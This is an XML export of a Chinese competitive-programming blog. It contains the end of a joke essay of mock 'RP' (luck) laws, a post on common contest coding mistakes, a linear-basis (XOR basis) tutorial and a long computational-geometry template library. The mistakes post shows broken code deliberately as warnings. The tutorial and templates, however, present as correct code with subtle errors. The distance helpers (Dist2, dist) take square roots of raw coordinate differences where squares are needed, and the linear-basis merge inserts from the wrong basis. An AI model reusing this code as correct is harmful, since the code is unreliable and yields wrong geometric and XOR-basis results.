(补充:按照该说法,可以得知,当一个人出生时,其RP是从他所在的空间周围的"自由RP"中汲取的,而从母体中获得的RP较少,但是如果周围的"自由RP"极度缺乏,那么只有可能从母体中获取,于是就出现了难产的情况)RP第二定律 RP不可能从低RP物体传向高RP物体而不引起其他变化 但由于RP的不确定性，RP可以从RP的数学期望低的物体传向高RP数学期望物体，这与第二定律不矛盾。 (例如:通过RP到现实利益的转化再由现实利益转化为RP的过程)RP第三定律 当一个人的RP无限减小时其生命力趋近于零，亦即任何一个活体生物的RP均不为零。 （或：对大量的事实的分析表明，绝对没RP不可能达到）RP第四定律​ 如果两个人中每一个人的RP值均于第三个人相同，那么她或他或它们彼此也必由RP值相等RP惯性定律 RP惯性学也自古就有。祸不单行.双喜临门.就是典型代表。 不过它却一直以来饱受批判，直接把这个理论推到了悬崖边上。但如今随着人类交流的日渐增多，惯性RP粒子经常被报道：诸如某X撞狗屎运中了500w之后又在股市大有斩获；或者某大衰刚碰上车祸马上被女友甩掉。 人们不得不正视RP存在惯性这一事实。RP的变化因素 总的来说，RP的变化因素不可控因素比可控因素占的因素还多，发生在身边的任何事都可能改变你的RP，正是因为这样，RP才经常变化于无形中，但是这不是我们放弃研究RP的理由，要在复杂的情况中提炼出简单的规律，化繁为简。笔者经过多年实践观察总结，列出了如下表格描述各种因素与RP的变化关系： 事件-----对RP影响（单位：fsfsfs ） 考试爆0（+6+6+6） 星际，羽毛球等被虐（+5+5+5） 扶老奶奶过街（+3+3+3） 星际，羽毛球等虐人（−10-10−10） %%%Lgy（+200+200+200） 在jf不幸滴看见某人（−100-100−100） （注：单位“fsfsfs“的定义为：vijosvijosvijos上AC一道题所需要的RP的量） 由上述表格可以看出，积累RP是不容易的，但是积累的RP却很容易在不经意之间丢失，（所谓“大自然厌恶高RP”，也就是说，RP越高的人，丢失RP也就会显得越容易）。这就是为什么很多人抱怨自己的RP从来就没好过，那是因为他们好不容易有点RP了，却由于自己不小心又做的损RP的事情而把宝贵的RP丢失了。（RP易转化为现实利益，且RP易挥发）人为调节RP的技巧与方法 说实话，对这一节的内容笔者没有十分的把握，因为笔者本人对这部分内容一直都很困惑，我希望能通过一些认为手段调节可怜的RP，但是理论跟实践的差距往往相当大，我理论分析总结的规律在实践中有时并不能行通，就像我有时候可以地遵守交通规则，不闯红灯，听妈妈的话等等等等，原本以为这样可以积累 RP，无奈考试还是要爆0，说白了就是RP对人似乎有天生的抵触情节，最经典的例子是与笔者同校的一个叫LKQ(化名)的同学在NOI之前不幸将自己的手机搞丢，本以为自己RP会增长到一定的程度，以帮助自己在NOI上获得较好的成绩，结果事与愿违，NOI还是不幸考挂，所以我们分析一个现实生活中的RP 问题，一定不能拘泥于某一些事情对于RP的影响，而应该纵览全局，客观考虑各种因素的影响，才能最后得出准确的结论，事实证明那位同学在NOI上被室友塞了满满一抽屉的硬币，硬币虽小，但对RP的影响却是巨大的，正如刚才论述的，RP失去容易获得难，虽然手机的价值远大于硬币，但是对于失去手机RP有所增长的这位仁兄来说，获得硬币所损失的RP更是一个恐怖的数字。所以要客观和全面地分析问题，才能获得准确和有效的结论。 但是我们不能因此就放弃对RP的调节，我们需要持之以恒的调节RP。因为根据SW的经验来看，追MM、谈恋爱等事情需耗费巨大的RP。例如：SW和其女同学一起吃完KFC出去的时候，其女同学说也许我们出去就会被汽车一起撞死，为了避免这种悲剧发生，SW不得不支付大量RP……所以各位需要不断的累积RP，来应付各种突发状况…… RP之变诈几何哉？止增笑耳。RP的奇律 任何理论都有其局限性，当然经典RP理论也是一样，某些时候RP会从某个人身上大量的涌现（俗称:RP爆发)，而此人之前的RP值表现平常甚至很低或者显示为负。RP爆发相当罕见，因此研究甚少，成果有待完善。最近研究表明:RP爆发一般是一种其概率与自己希望爆发的程度2次方成反比的情况上述事实表明,经典RP理论有其局限性.这里我们就要以量子RP理论进行改进.可以证明,RP具有量子特征,即，RP可以自发跃迁,也可以激发跃迁.此时会放出某种特殊的波,在宏观上表现就是一些离奇事件的发生;RP满足海森堡不确定性原理RP仅可以用统计观点来阐释,即只能大体说明在一段时间内某部分的人的RP有怎样的统计规律,任何企图精确说明某时刻在某人的RP,进而预测其做事的成功尝试都是不可能的,也是没有意义的.]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>随笔</tag>
        <tag>RP</tag>
        <tag>NOI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「总结」一些OI竞赛中的常见错误]]></title>
    <url>%2Farticles%2FzzWA%2F</url>
    <content type="text"><![CDATA[总结一下再NOIP/NOI以及一些算法竞赛中的zz错误，建议阅读一些编译错误mian函数1234int mian(int argc, char *argc[]) &#123; /*Code*/ return 0;&#125;定义了一些有锅的宏1234#define max(a,b) (((a) &gt; (b)) ? (a) : (b))/*.....*/int maxx = max(i++, j);注意！我们在传给宏定义的时候，是原样复制的！也就是说，这条语句就是:1int maxx = (((i++) &gt; (j)) ? (i++) : (j));可以看到，i++被执行了两次，就会凉凉头文件注意，我们再使用Dev-c++的时候，我们所使用的freopen流是包含在iostream库中的！123456789101112131415#include &lt;iostream&gt;#define FILEint number;int main(int argc, char *argv[]) &#123;#ifdef FILE freopen ("Input.in" , "r", stdin ); freopen ("Output.out", "w", stdout);#endif std::cin &gt;&gt; number; std::cout &lt;&lt; (number + 1) * number / 2; return 0;&#125;如图，这是求1+2+3+...+n1 + 2 + 3 + ... + n1+2+3+...+n的程序我们在本地用Dev-c++时，会成功编译但是，到了Lemon , Cena 等评测机上，就会爆零文件freopen很多选手都经常会在第一次考试中忘写freopenstdout 还是 stdin??12freopen ("Input.in" , "r", stdout);freopen ("Output.out", "w", stdin );上述代码stdin和stdout弄反了，爆零再考试中一定要注意这些细节问题算法错误memsetmemset函数只能对−1-1−1 和000 (0×3f0\times3f0×3f)进行全体赋值！1memset (Array, 19260817, sizeof(Array));这样不会江ArrayArrayArray进行全体赋值为19260817 !死循环12for (int i = start_i; i &gt;= 0; i++) for (int j = start_j; i &gt;= 0; i++)上述代码明显会炸未完待续Shq′sBlog\mathfrak {Shq&#x27;s \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>NOI</tag>
        <tag>算法竞赛</tag>
        <tag>总结</tag>
        <tag>智熄</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数论」线性基]]></title>
    <url>%2Farticles%2Flinear-basis%2F</url>
    <content type="text"><![CDATA[线性基是出现在信息学竞赛中的一个名词，常见于神犇博客题解中线性基也是数学中的一个常用的方法引入基：在线性代数中，基（也称为基底）是描述、刻画向量空间的基本工具。向量空间的基是它的一个特殊的子集，基的元素称为基向量。向量空间中任意一个元素，都可以唯一地表示成基向量的线性组合。如果基中元素个数有限，就称向量空间为有限维向量空间，将元素的个数称作向量空间的维数。定义设数集TTT的值域范围为[1,2n−1][1,2^n-1][1,2​n​​−1] TTT的线性基是TTT的一个子集A={a1,a2,a3,...,an}A=\{a_1,a_2,a_3,...,a_n\}A={a​1​​,a​2​​,a​3​​,...,a​n​​} AAA中元素互相xorxorxor所形成的异或集合，等价于原数集TTT的元素互相xorxorxor形成的异或集合 可以理解为将原数集进行了压缩。性质线性基的异或集合中不存在000线性基的异或集合中每个元素的异或唯一，其实这个跟性质1是等价的线性基二进制最高位互不相同如果线性基是满的，它的异或集合为[1,2n−1][1,2^n-1][1,2​n​​−1]线性基中元素互相异或，异或集合不变维护插入如果向线性基中插入数xxx，从高位到低位扫描它为111的二进制位 扫描到第iii时，如果aia_ia​i​​不存在，就令ai=xa_i=xa​i​​=x，否则x=x⊗aix=x \otimes a_ix=x⊗a​i​​ xxx的结局是，要么被扔进线性基，要么经过一系列操作过后，变成了00012345678bool insert(long long val) &#123; for (int i = 60; i &gt;= 0; i--) if (val&amp;(1LL &lt;&lt; i)) &#123; if (!a[i]) a[i] = val, break; val ^= a[i]; &#125; return val &gt; 0;&#125;合并将一个线性基暴力插入另一个线性基即可。123456LinearBasis merge(const LinearBasis &amp;n1,const LinearBasis &amp;n2, int num)&#123; LinearBasis ret = n1; for (int i = 0; i &lt;= num; i++) if (n2.d[i]) ret.insert(n2.d[i]); return ret;&#125;All Code:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061const int MAXN = 61;struct LinearBasis &#123; long long d[MAXN], p[MAXN]; int cnt; LinearBasis() &#123; memset(d, 0, sizeof(d)); memset(p, 0, sizeof(p)); cnt = 0; &#125; bool insert(long long val, int num) &#123; for (int i = num; i &gt;= 0; i--) if (val &amp; (1LL &lt;&lt; i)) &#123; if (!d[i]) &#123;d[i] = val; break;&#125; val ^= d[i]; &#125; return val &gt; 0; &#125; long long query_max(int num) &#123; long long ret = 0; for (int i = num; i &gt;= 0; i--) if ((ret ^ d[i]) &gt; ret) ret ^= d[i]; return ret; &#125; long long query_min(int num) &#123; for (int i = 0; i &lt;= num; i++) if (d[i]) return d[i]; return 0; &#125; void rebuild(int num) &#123; for (int i = num; i &gt;= 0; i--) for (int j = i - 1; j &gt;= 0; j--) if (d[i] &amp; (1LL &lt;&lt; j)) d[i] ^= d[j]; for (int i = 0; i &lt;= num; i++) if (d[i]) p[cnt++] = d[i]; &#125; long long kthquery(long long k, int num) &#123; int ret = 0; if (k &gt;= (1LL &lt;&lt; cnt)) return -1; for (int i = num; i &gt;= 0;i--) if (k&amp;(1LL&lt;&lt;i)) ret^=p[i]; return ret; &#125;&#125;LinearBasis merge(const LinearBasis &amp;n1,const LinearBasis &amp;n2, int num) &#123; LinearBasis ret=n1; for (int i = num; i&gt;=0;i--) if (n2.d[i]) ret.insert(n1.d[i]); return ret;&#125;先写到这吧Shq′sBlog\mathfrak {Shq&#x27;s \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线性基</tag>
        <tag>集合</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「总结」计算几何一些常用模板]]></title>
    <url>%2Farticles%2FComputational-geometry2%2F</url>
    <content type="text"><![CDATA[本文是计算几何一些模板的汇总以后计算几何就不写板子了 ( 逃Code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;ctime&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;stack&gt;typedef long long int LL ;const int N = 100000+7;#define abs(x) (((x)&gt;0)?(x):-(x))/***************************************/const double PI = acos(-1.0);const double eps = 1e-8;const double INF = 1e18;#define pb push_back#define mp std::make_pair///*************基础***********/double torad(double deg) &#123; return deg / 180 * PI; &#125;inline int dcmp(double x) &#123; if(fabs(x) &lt; eps) return 0; else return x &lt; 0 ? -1 : 1;&#125;struct Point &#123; double x, y; Point(double x=0, double y=0):x(x),y(y) &#123; &#125; inline void read() &#123; scanf("%lf%lf", &amp;x, &amp;y); &#125;&#125;;typedef std::vector&lt;Point&gt; Polygon;typedef Point Vector;inline Vector operator+ (Vector A, Vector B) &#123; return Vector(A.x + B.x, A.y + B.y); &#125;inline Vector operator- (Point A, Point B) &#123; return Vector(A.x - B.x, A.y - B.y); &#125;inline Vector operator* (Vector A, double p) &#123; return Vector(A.x * p, A.y * p); &#125;inline Vector operator/ (Vector A, double p) &#123; return Vector(A.x / p, A.y / p); &#125;inline bool operator &lt; (Point a, Point b) &#123; return a.x &lt; b.x || (a.x == b.x &amp;&amp; a.y &lt; b.y); &#125;inline bool operator == (Point a, Point b) &#123; return dcmp(a.x - b.x) == 0 &amp;&amp; dcmp(a.y - b.y) == 0; &#125;inline double Dot(Vector A, Vector B) &#123; return A.x * B.x + A.y * B.y;&#125;inline double Length(Vector A) &#123; return sqrt(Dot(A, A));&#125;inline double Angle(Vector A, Vector B) &#123; return acos(Dot(A, B) / Length(A) / Length(B));&#125;inline double angle(Vector v) &#123; return atan2(v.y, v.x);&#125;inline double Cross(Vector A, Vector B) &#123; return A.x * B.y - A.y * B.x;&#125;inline Vector Unit(Vector x) &#123; return x / Length(x);&#125; //单位向量inline Vector Normal(Vector x) &#123; return Point(-x.y, x.x) / Length(x);&#125; //垂直法向量inline double Area2(Point A, Point B, Point C) &#123; return Cross(B - A, C - A);&#125;inline Vector Rotate(Vector A, double rad)&#123; return Vector(A.x * cos(rad) - A.y*sin(rad), A.x*sin(rad) + A.y * cos(rad));&#125;/****************直线与线段**************///求直线p+tv和q+tw的交点 Cross(v, w) == 0无交点Point GetLineIntersection(Point p, Vector v, Point q, Vector w) &#123; Vector u = p - q; double t = Cross(w, u) / Cross(v, w); return p + v * t;&#125;//点p在直线ab的投影inline Point GetLineProjection(Point P, Point A, Point B) &#123; Vector v = B - A; return A + v * (Dot(v, P - A) / Dot(v, v));&#125;//点到直线距离inline double DistanceToLine(Point P, Point A, Point B) &#123; Vector v1 = B - A, v2 = P - A; return fabs(Cross(v1, v2)) / Length(v1); // 如果不取绝对值，得到的是有向距离&#125;//点在p线段上(包括端点)inline bool OnSegment(Point p, Point a1, Point a2) &#123; return dcmp(Cross(a1-p, a2-p)) == 0 &amp;&amp; dcmp(Dot(a1 - p, a2 - p)) &lt;= 0;&#125;// 过两点p1, p2的直线一般方程ax+by+c=0// (x2-x1)(y-y1) = (y2-y1)(x-x1)inline void getLineGeneralEquation(Point p1, Point p2, double&amp; a, double&amp; b, double &amp;c)&#123; a = p2.y - p1.y; b = p1.x - p2.x; c = -a * p1.x - b * p1.y;&#125;//点到线段距离double DistanceToSegment(Point p, Point a, Point b) &#123; if(a == b) return Length(p - a); Vector v1 = b - a, v2 = p - a, v3 = p - b; if(dcmp(Dot(v1, v2)) &lt; 0) return Length(v2); else if(dcmp(Dot(v1, v3)) &gt; 0) return Length(v3); else return fabs(Cross(v1, v2)) / Length(v1);&#125;//两线段最近距离inline double dis_pair_seg(Point p1, Point p2, Point p3, Point p4) &#123; return std::min(std::min(DistanceToSegment(p1, p3, p4), DistanceToSegment(p2, p3, p4)), std::min(DistanceToSegment(p3, p1, p2), DistanceToSegment(p4, p1, p2)));&#125;//线段相交判定inline bool SegmentProperIntersection(Point a1, Point a2, Point b1, Point b2) &#123; double c1 = Cross(a2 - a1, b1 - a1), c2 = Cross(a2 - a1, b2 - a1), c3 = Cross(b2 - b1, a1 - b1), c4 = Cross(b2 - b1, a2 - b1); return dcmp(c1) * dcmp(c2) &lt; 0 &amp;&amp; dcmp(c3) * dcmp(c4) &lt; 0;&#125;// 有向直线。它的左边就是对应的半平面struct Line &#123; Point p, q; // 直线上任意一点,p作为起点 Vector v; // 方向向量 double ang; // 极角，即从x正半轴旋转到向量v所需要的角（弧度） Line() &#123;&#125;// Line(Point P, Vector v):p(P),v(v) &#123;// ang = atan2(v.y, v.x);// &#125; Line(Point P, Point Q):p(P), q(Q) &#123; v = q - p; ang = atan2(v.y, v.x); &#125; inline bool operator &lt; (const Line&amp; L) const &#123; return ang &lt; L.ang; &#125; inline Point point(double t) &#123; return p + v * t; &#125; inline Line move(double d) &#123; return Line(p + Normal(v) * d, v); &#125; inline void read() &#123; Point q; p.read(), q.read(); v = q - p; ang = atan2(v.y, v.x); &#125;&#125;;//两直线交点inline Point GetLineIntersection(Line a, Line b) &#123; return GetLineIntersection(a.p, a.v, b.p, b.v);&#125;// 点p在有向直线L的左边（线上不算）inline bool OnLeft(const Line&amp; L, const Point&amp; p) &#123; return Cross(L.v, p - L.p) &gt; 0;&#125;//// 二直线交点，假定交点惟一存在//Point GetLineIntersection(const Line&amp; a, const Line&amp; b) &#123;// Vector u = a.P-b.P;// double t = Cross(b.v, u) / Cross(a.v, b.v);// return a.P+a.v*t;//&#125;// 半平面交主过程std::vector&lt;Point&gt; HalfplaneIntersection(std::vector&lt;Line&gt; L) &#123; int n = L.size(); sort(L.begin(), L.end()); // 按极角排序 int first, last; // 双端队列的第一个元素和最后一个元素的下标 std::vector&lt;Point&gt; p(n); // p[i]为q[i]和q[i+1]的交点 std::vector&lt;Line&gt; q(n); // 双端队列 std::vector&lt;Point&gt; ans; // 结果 q[first=last=0] = L[0]; // 双端队列初始化为只有一个半平面L[0] for(int i = 1; i &lt; n; i++) &#123; while(first &lt; last &amp;&amp; !OnLeft(L[i], p[last - 1])) last--; while(first &lt; last &amp;&amp; !OnLeft(L[i], p[first])) first++; q[++last] = L[i]; if(fabs(Cross(q[last].v, q[last - 1].v)) &lt; eps) &#123; last--; if(OnLeft(q[last], L[i].p)) q[last] = L[i]; &#125; if(first &lt; last) p[last - 1] = GetLineIntersection(q[last - 1], q[last]); &#125; while(first &lt; last &amp;&amp; !OnLeft(q[first], p[last-1])) last--; // 删除无用平面 if(last - first &lt;= 1) return ans; // 空集 p[last] = GetLineIntersection(q[last], q[first]); // 计算首尾两个半平面的交点 // 从deque复制到输出中 for(int i = first; i &lt;= last; i++) ans.push_back(p[i]); return ans;&#125;/***********多边形**************/double PolygonArea(std::vector&lt;Point&gt; p) &#123; int n = p.size(); double area = 0; for(int i = 1; i &lt; n - 1; i++) area += Cross(p[i] - p[0], p[i + 1 ] - p[0]); return area / 2;&#125;//判断点是否在多边形内int isPointInPolygon(Point p, Polygon poly) &#123; int wn = 0; int n = poly.size(); for (int i = 0; i &lt; n; i++) &#123; if (OnSegment(p, poly[i], poly[(i + 1) % n])) return -1; //边界 int k = dcmp(Cross(poly[(i + 1) % n] - poly[i], p - poly[i])); int d1 = dcmp(poly[i].y - p.y); int d2 = dcmp(poly[(i + 1) % n].y - p.y); if (k &gt; 0 &amp;&amp; d1 &lt;= 0 &amp;&amp; d2 &gt; 0) wn++; if (k &lt; 0 &amp;&amp; d2 &lt;= 0 &amp;&amp; d1 &gt; 0) wn--; &#125; if (wn != 0) return 1; //内部 return 0; //外部&#125;//多边形重心 点集逆时针给出Point PolyGravity(Point *p, int n) &#123; Point tmp, g = Point(0, 0); double sumArea = 0, area; for (int i=2; i&lt;n; ++i) &#123; area = Cross(p[i-1]-p[0], p[i]-p[0]); sumArea += area; tmp.x = p[0].x + p[i-1].x + p[i].x; tmp.y = p[0].y + p[i-1].y + p[i].y; g.x += tmp.x * area; g.y += tmp.y * area; &#125; g.x /= (sumArea * 3.0); g.y /= (sumArea * 3.0); return g;&#125;//多边形重心计算模板Point bcenter(std::vector&lt;Point&gt; pnt) &#123; int n = pnt.size(); Point p, s; double tp, area = 0, tpx = 0, tpy = 0; p.x = pnt[0].x; p.y = pnt[0].y; //FE(i, 1, n) for(int i = 1; i &lt;= n; i++) &#123; s.x = pnt[(i == n) ? 0 : i].x; s.y = pnt[(i == n) ? 0 : i].y; tp = (p.x * s.y - s.x * p.y); area += tp / 2; tpx += (p.x + s.x) * tp; tpy += (p.y + s.y) * tp; p.x = s.x; p.y = s.y; &#125; s.x = tpx / (6 * area); s.y = tpy / (6 * area); return s;&#125;// 点集凸包// 如果希望在凸包的边上有输入点，把两个 &lt;= 改成 &lt;// 注意：输入点集会被修改std::vector&lt;Point&gt; ConvexHull(std::vector&lt;Point&gt;&amp; p) &#123; // 预处理，删除重复点 sort(p.begin(), p.end()); p.erase(unique(p.begin(), p.end()), p.end()); int n = p.size(); int m = 0; std::vector&lt;Point&gt; ch(n+1); for(int i = 0; i &lt; n; i++) &#123; while(m &gt; 1 &amp;&amp; Cross(ch[m-1]-ch[m-2], p[i]-ch[m-2]) &lt;= 0) m--; ch[m++] = p[i]; &#125; int k = m; for(int i = n - 2; i &gt;= 0; i--) &#123; while(m &gt; k &amp;&amp; Cross(ch[m - 1] - ch[m - 2], p[i] - ch[m - 2]) &lt;= 0) m--; ch[m++] = p[i]; &#125; if(n &gt; 1) m--; ch.resize(m); return ch;&#125;inline double Dist2(Point a, Point b) &#123; return sqrt(a.x - b.x) + sqrt(a.y - b.y);&#125;// 返回点集直径的平方double diameter2(std::vector&lt;Point&gt;&amp; points) &#123; std::vector&lt;Point&gt; p = ConvexHull(points); int n = p.size(); if(n == 1) return 0; if(n == 2) return Dist2(p[0], p[1]); p.push_back(p[0]); // 免得取模 double ans = 0; for(int u = 0, v = 1; u &lt; n; u++) &#123; // 一条直线贴住边p[u]-p[u+1] while(true)&#123; // 当Area(p[u], p[u + 1], p[v + 1]) &lt;= Area(p[u], p[u + 1], p[v])时停止旋转 // 即Cross(p[u + 1] - p[u], p[v + 1] - p[u]) - Cross(p[u + 1] - p[u], p[v] - p[u]) &lt;= 0 // 根据Cross(A, B) - Cross(A, C) = Cross(A, B - C) // 化简得Cross(p[u + 1] - p[u], p[v + 1] - p[v]) &lt;= 0 int diff = Cross(p[u + 1] - p[u], p[v + 1]-p[v]); if(diff &lt;= 0) &#123; ans = std::max(ans, Dist2(p[u], p[v])); // u和v是对踵点 if(diff == 0) ans = std::max(ans, Dist2(p[u], p[v+1])); // diff == 0时u和v+1也是对踵点 break; &#125; v = (v + 1) % n; &#125; &#125; return ans;&#125;//两凸包最近距离double RC_Distance(Point *ch1, Point *ch2, int n, int m) &#123; int q = 0, p = 0; //REP(i, n) for(int i = 1; i &lt;= n; i++) if(ch1[i].y-ch1[p].y &lt; -eps) p = i; //REP(i, m) for(int i = 1; i &lt;= m; i++) if(ch2[i].y - ch2[q].y &gt; eps) q = i; ch1[n] = ch1[0]; ch2[m] = ch2[0]; double tmp, ans = 1e100; //REP(i, n) for(int i = 1; i &lt;= n; i++) &#123; while((tmp = Cross(ch1[p + 1] - ch1[p], ch2[q + 1] - ch1[p]) - Cross(ch1[p + 1] - ch1[p], ch2[q] - ch1[p])) &gt; eps) q = (q + 1)%m; if(tmp &lt; -eps) ans = std::min(ans, DistanceToSegment(ch2[q], ch1[p], ch1[p + 1])); else ans = std::min(ans,dis_pair_seg(ch1[p],ch1[p+1],ch2[q],ch2[q+1])); p=(p + 1)%n; &#125; return ans;&#125;//两凸包最近距离//使用vectordouble RC_Distance(std::vector&lt;Point&gt; ch1, std::vector&lt;Point&gt; ch2) &#123; int q = 0, p = 0, n = ch1.size(), m = ch2.size(); //REP(i, n) for(int i = 1; i &lt;= n; i++) if(ch1[i].y - ch1[p].y &lt; -eps) p = i; //REP(i, m) for(int i = 1; i &lt;= m; i++) if(ch2[i].y - ch2[q].y &gt; eps) q = i; ch1.push_back(ch1[0]), ch2.push_back(ch2[0]); double tmp, ans = 1e100; //REP(i, n) for(int i = 1; i &lt;= n; i++) &#123; while((tmp = Cross(ch1[p + 1] - ch1[p], ch2[q + 1] - ch1[p]) - Cross(ch1[p + 1] - ch1[p], ch2[q] - ch1[p])) &gt; eps) q = (q + 1) % m; if(tmp &lt; -eps) ans = std::min(ans,DistanceToSegment(ch2[q],ch1[p],ch1[p+1])); else ans = std::min(ans,dis_pair_seg(ch1[p],ch1[p+1],ch2[q],ch2[q+1])); p = (p + 1)%n; &#125; return ans;&#125;//凸包最大内接三角形double RC_Triangle(Point* res,int n) &#123; if(n &lt; 3) return 0; double ans = 0, tmp; res[n] = res[0]; int j, k; //REP(i, n) for(int i = 1; i &lt;= n; i++) &#123; j = (i +1)%n; k = (j +1)%n; while((j != k) &amp;&amp; (k != i)) &#123; while(Cross(res[j] - res[i], res[k +1] - res[i]) &gt; Cross(res[j] - res[i], res[k] - res[i])) k= (k +1)%n; tmp = Cross(res[j] - res[i], res[k] - res[i]); if(tmp &gt; ans) ans = tmp; j = (j +1)%n; &#125; &#125; return ans;&#125;//凸包最大内接三角形double RC_Triangle2(std::vector&lt;Point&gt; res, Point&amp; a, Point&amp; b, Point&amp; c) &#123; int n = res.size(); if(n &lt; 3) return 0; double ans=0, tmp; res.push_back(res[0]); int j, k; //REP(i, n) for(int i=1;i&lt;=n;i++) &#123; j = (i+1)%n; k = (j+1)%n; while((j != k) &amp;&amp; (k != i)) &#123; while(Cross(res[j] - res[i], res[k+1] - res[i]) &gt; Cross(res[j] - res[i], res[k] - res[i])) k= (k+1)%n; tmp = Cross(res[j] - res[i], res[k] - res[i]); if(tmp &gt; ans) &#123; a = res[i], b = res[j], c = res[k]; ans = tmp; &#125; j = (j+1)%n; &#125; &#125; return ans;&#125;//判断两凸包是否有交点bool ConvexPolygonDisjoint(const std::vector&lt;Point&gt; ch1, const std::vector&lt;Point&gt; ch2) &#123; int c1 = ch1.size(); int c2 = ch2.size(); for(int i = 0; i &lt; c1; i++) if(isPointInPolygon(ch1[i], ch2) != 0) return false; // 内部或边界上 for(int i = 0; i &lt; c2; i++) if(isPointInPolygon(ch2[i], ch1) != 0) return false; // 内部或边界上 for(int i = 0; i &lt; c1; i++) for(int j = 0; j &lt; c2; j++) if(SegmentProperIntersection(ch1[i], ch1[(i+1)%c1], ch2[j], ch2[(j+1)%c2])) return false; return true;&#125;inline double dist(Point a, Point b) &#123; return Length(a - b);&#125;////模拟退火求费马点 保存在ptres中//double fermat_point(Point *pt, int n, Point&amp; ptres) &#123;// Point u, v;// double step = 0.0, curlen, explen, std::minlen;// int i, j, k;// bool flag;// u.x = u.y = v.x = v.y = 0.0;// //REP(i, n)// for(int i=1;i&lt;=n;i++) &#123;// step += fabs(pt[i].x) + fabs(pt[i].y);// u.x += pt[i].x;// u.y += pt[i].y;// &#125;// u.x /= n;// u.y /= n;// flag = 0;// while(step &gt; eps) &#123;// for(k = 0; k &lt; 10; step /= 2, ++k)// for(i = -1; i &lt;= 1; ++i)// for(j = -1; j &lt;= 1; ++j) &#123;// v.x = u.x + step*i;// v.y = u.y + step*j;// curlen = explen = 0.0;// //REP(i, n)// for(int i=1;i&lt;=n;i++) &#123;// curlen += dist(u, pt[idx]);// explen += dist(v, pt[idx]);// &#125;// if(curlen &gt; explen) &#123;// u = v;// std::minlen = explen;// flag = 1;// &#125;// &#125;// &#125;// ptres = u;// return flag ? std::minlen : curlen;//&#125;//多边形费马点//到所有顶点的距离和最小Point Fermat(int np, Point* p) &#123; double nowx = 0, nowy = 0; double nextx = 0, nexty = 0; //REP(i, np) for(int i=1;i&lt;=np;i++) &#123; nowx += p[i].x; nowy += p[i].y; &#125; for (nowx /= np, nowy /= np;; nowx = nextx, nowy = nexty) &#123; double topx = 0, topy = 0, bot = 0; //REP(i, np) for(int i=1;i&lt;=np;i++) &#123; double d = sqrt(sqrt(nowx - p[i].x) + sqrt(nowy - p[i].y)); topx += p[i].x / d; topy += p[i].y / d; bot += 1 / d; &#125; nextx = topx / bot; nexty = topy / bot; if (dcmp(nextx - nowx) == 0 &amp;&amp; dcmp(nexty - nowy) == 0) break; &#125; Point fp; fp.x = nowx; fp.y = nowy; return fp;&#125;//最近点对//使用前先对输入的point进行排序,使用cmpxy函数Point point[N];int tmpt[N];inline double dist(int x, int y) &#123; Point&amp; a = point[x]; Point&amp; b = point[y]; return sqrt(sqrt(a.x - b.x) + sqrt(a.y - b.y));&#125;inline bool cmpxy(Point a, Point b) &#123; if(a.x != b.x) return a.x &lt; b.x; return a.y &lt; b.y;&#125;inline bool cmpy(int a, int b) &#123; return point[a].y &lt; point[b].y;&#125;double Closest_Pair(int left, int right) &#123; double d = INF; if(left==right) return d; if(left + 1 == right) return dist(left, right); int mid = (left+right)&gt;&gt;1; double d1 = Closest_Pair(left,mid); double d2 = Closest_Pair(mid+1,right); d = std::min(d1,d2); int k=0; //分离出宽度为d的区间 //FE(i, left, right) for(int i=left;i&lt;=right;i++) &#123; if(fabs(point[mid].x-point[i].x) &lt;= d) tmpt[k++] = i; &#125; std::sort(tmpt,tmpt+k,cmpy); //线性扫描 //REP(i, k) for(int i=0;i&lt;k;i++) &#123; for(int j = i+1; j &lt; k &amp;&amp; point[tmpt[j]].y-point[tmpt[i]].y&lt;d; j++) &#123; double d3 = dist(tmpt[i],tmpt[j]); if(d &gt; d3) d = d3; &#125; &#125; return d;&#125;/************圆************/struct Circle 